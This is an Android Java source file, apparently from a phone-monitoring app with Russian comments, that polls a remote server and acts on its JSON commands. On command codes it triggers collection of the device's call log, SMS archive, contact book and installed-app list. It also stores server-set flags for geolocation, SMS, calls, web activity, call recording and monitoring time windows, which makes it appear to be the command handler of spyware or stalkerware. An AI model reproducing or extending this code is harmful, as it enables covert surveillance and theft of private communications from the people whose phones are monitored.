package com.inet.android.request;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.archive.ArchiveCall;
import com.inet.android.archive.ArchiveSms;
import com.inet.android.bs.Caller;
import com.inet.android.bs.ListApp;
import com.inet.android.contacts.GetContacts;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.info.GetInfo;
import com.inet.android.utils.Logging;

/**
 * Periodic request class
 * 
 * @author johny homicide
 * 
 */
public class PeriodicRequest extends DefaultRequest {
	private final String LOG_TAG = "PeriodicRequest";
	static RequestDataBaseHelper db;
	private final int type = 2;
	boolean periodicalFlag = true;
	Context ctx;

	public PeriodicRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		PeriodicRequestTask frt = new PeriodicRequestTask();
		frt.execute(request);
	}

	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		if (!request.equals(" ")) {
			String str = null;
			try {
				Logging.doLog(LOG_TAG, request, request);
				str = Caller.doMake(request, "periodic", ctx);
			} catch (IOException e) {
				e.printStackTrace();
				db = new RequestDataBaseHelper(ctx);

				if (db.getExistType(type) == false) {
					db.addRequest(new RequestWithDataBase(request, type));
				}
			}
			if (str != null) {
				getRequestData(str);
			} else {
				Logging.doLog(LOG_TAG,
						"ответа от сервера нет или он некорректен",
						"ответа от сервера нет или он некорректен");
				SharedPreferences sp = PreferenceManager
						.getDefaultSharedPreferences(ctx);
				Editor ed = sp.edit();
				ed.putString("code", "1");
				ed.commit();

			}
		} else {
			Logging.doLog(LOG_TAG, "request == null", "request == null");
		}
	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		Editor ed = sp.edit();

		JSONObject jsonObject;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			return;
		}

		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "");
		}

		// режим ожидания принятия решения
		if (str.equals("1")) {
			ed.putString("period", "1");
			ed.commit();
			return;
		}

		// переход в пассивный режим работы
		if (str.equals("3")) {
			ed.putString("period", "10");
			ed.commit();
			return;
		}

		// ошибки
		if (str.equals("0")) {
			String errstr = null;
			try {
				errstr = jsonObject.getString("error");
			} catch (JSONException e) {
				errstr = null;
			}
			if (errstr != null) {
				ed.putString("error", errstr);
			} else {
				ed.putString("error", "");
			}
			ed.commit();
			return;
		}

		// активный режим работы
		if (str.equals("2")) {
			if (sp.getBoolean("getInfo", false) == true) {
				GetInfo getInfo = new GetInfo(ctx);
				getInfo.getInfo();
				ed.putBoolean("getInfo", false);
			}
			ed.putString("period", "1");
			String listStr = null;
			try {
				listStr = jsonObject.getJSONArray("list").toString();
				Logging.doLog(LOG_TAG, "list: " + listStr, "list: " + listStr);
				
				if (listStr.indexOf("1") != -1) {
					// Вызвать метод для списка звонков
					Logging.doLog(LOG_TAG, "listStr.indexOf 1", "listStr.indexOf 1");
					
					ArchiveCall arhCall = new ArchiveCall();
					arhCall.execute(ctx);
				}
				if (listStr.indexOf("2") != -1) {
					// Вызвать метод для списка смс
					Logging.doLog(LOG_TAG, "listStr.indexOf 2", "listStr.indexOf 2");
					
					ArchiveSms arhSms = new ArchiveSms();
					arhSms.execute(ctx);
//					GetContacts getCont = new GetContacts();
//					getCont.execute(ctx);
				}
				if (listStr.indexOf("3") != -1) {
					// Вызвать метод для телефонной книги
					Logging.doLog(LOG_TAG, "listStr.indexOf 3", "listStr.indexOf 3");
					
					GetContacts getCont = new GetContacts();
					getCont.execute(ctx);
				}
				if (listStr.indexOf("4") != -1) {
					// Вызвать метод для установленных приложений
					Logging.doLog(LOG_TAG, "listStr.indexOf 4", "listStr.indexOf 4");
					
					ListApp listApp = new ListApp();
					listApp.getListOfInstalledApp(ctx);
				}
			} catch (JSONException e) {
				listStr = null;
			}

			ed.commit();
		}

		try {
			str = jsonObject.getString("geo");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("geo", str);
		} else {
			ed.putString("geo", "0");
		}

		try {
			str = jsonObject.getString("geo_mode");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("geo_mode", str);
		} else {
			ed.putString("geo_mode", "1");
		}

		try {
			str = jsonObject.getString("sms");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("sms", str);
		} else {
			ed.putString("sms", "0");
		}

		try {
			str = jsonObject.getString("call");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("call", str);
		} else {
			ed.putString("call", "0");
		}

		try {
			str = jsonObject.getString("telbook");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("telbook", str);
		
		} else {
			ed.putString("telbook", "0");
		}

		try {
			str = jsonObject.getString("listapp");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("listapp", str);
		} else {
			ed.putString("listapp", "0");
		}

		try {
			str = jsonObject.getString("arhsms");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("arhsms", str);
//			ArchiveSms arhSms = new ArchiveSms();
//			arhSms.execute(ctx);
		} else {
			ed.putString("arhsms", "0");
		}

		try {
			str = jsonObject.getString("arhcall");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("arhcall", str);
//			ArchiveCall arhCall = new ArchiveCall();
//			arhCall.execute(ctx);
		} else {
			ed.putString("arhcall", "0");
		}

		try {
			str = jsonObject.getString("www");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("www", str);
		} else {
			ed.putString("www", "0");
		}

		try {
			str = jsonObject.getString("recall");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("recall", str);
		} else {
			ed.putString("recall", "0");
		}

		try {
			str = jsonObject.getString("UTCT");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("UTCT", str);
		} else {
			ed.putString("UTCT", "0");
		}

		try {
			str = jsonObject.getString("time_from");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("time_from", str);
		} else {
			ed.putString("time_from", "");
		}

		try {
			str = jsonObject.getString("time_to");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("time_to", str);
		} else {
			ed.putString("time_to", "");
		}

		try {
			str = jsonObject.getString("brk_from");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("brk_from", str);
		} else {
			ed.putString("brk_from", "");
		}

		try {
			str = jsonObject.getString("brk_to");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("brk_to", str);
		} else {
			ed.putString("brk_to", "");
		}

		try {
			str = jsonObject.getString("error");
			if (str.equals("0")) {
				Logging.doLog(LOG_TAG, "account не найден", "account не найден");
				ed.putString("account", "account");
			}
			if (str.equals("1"))
				Logging.doLog(LOG_TAG,
						"imei отсутствует или имеет неверный формат",
						"imei отсутствует или имеет неверный формат");
			if (str.equals("2"))
				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
						"устройство с указанным imei уже есть");
			if (str.equals("3"))
				Logging.doLog(LOG_TAG, "отсутствует ключ", "отсутствует ключ");
			if (str.equals("4"))
				Logging.doLog(LOG_TAG, "отсутствует или неверный type",
						"отсутствует или неверный type");

		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("error", str);
		} else {
			ed.putString("error", "");
		}

		ed.commit();
	}
}
